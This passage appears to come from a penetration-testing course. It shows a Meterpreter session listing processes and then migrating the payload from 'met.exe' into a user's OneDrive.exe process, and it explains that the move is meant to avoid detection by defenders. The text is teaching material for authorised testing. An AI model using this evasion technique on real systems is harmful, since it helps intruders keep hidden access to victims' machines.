=========

| PID | PPID | Name | Arch | Session | User | Path |
| --- | --- | --- | --- | --- | --- | --- |
| 2552 | 8500 | met.exe | x64 | 0 | ITWK0\luiza | C:\Users\luiza\met.exe |
| 8052 | 4892 | OneDrive.exe | x64 | 1 | ITWK0\offsec | C:\Users\offsec\AppData\Local\Microsoft\OneDrive\OneDrive.exe |

List 678 shows that the process met.exe has the process ID 2552. The name and path will easily make the process stand out to a defender reviewing the process list. The output shows that offsec started a process to OneDrive with process ID 8052. If our payload runs within this process, it is far less likely to be detected by reviewing the process list.

We should note that we are only able to migrate into processes that execute at the same (or lower) integrity and privilege level than that of our process. In the context of this example, we already elevated our privileges to NT AUTHORITY\SYSTEM so our choices are plentiful.

Let's migrate our current process to OneDrive.exe of the user offsec by entering migrate and process we want to migrate.

```
meterpreter > migrate 8052
[*] Migrating from 2552 to 8052...
[*] Migration completed successfully.
```
